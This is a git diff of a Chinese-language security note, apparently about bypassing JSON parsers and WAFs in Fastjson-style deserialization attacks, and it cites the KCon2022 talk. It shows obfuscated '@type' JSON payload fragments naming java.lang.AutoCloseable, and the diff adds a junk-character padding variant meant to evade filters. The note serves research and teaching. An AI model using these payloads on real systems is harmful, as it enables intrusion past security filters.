@@ -75,9 +75,20 @@ Content-Transfer-Encoding: quoted-printable
 ------WebKitFormBoundaryAO5f48pfmr4ErWMN--
 ```
 ```json
-{,new:[NaN,x'00',{,/*}*/'\x40\u0074\x79\u0070\x65':xjava.langAutoCloseable"
+{,new:[NaN,x'00',{,/*}*/'\x40\u0074\x79\u0070\x65':xjava.langAutoCloseable"  
 ```
 垃圾字符:
+```
+[11111111111111111111111111111111111...
+,[11111111111111111111111111111111111...
+,[11111111111111111111111111111111111...
+,[11111111111111111111111111111111111...
+,[11111111111111111111111111111111111...
+,...,{'\x40\u0074\x79\u0070\x65':xjava.lang.AutoCloseable"
+...
+]]]]]
+```
+
 ## 参考
 [Hacking JSON KCon2022](https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf)  
 https://b1ue.cn/archives/402.html
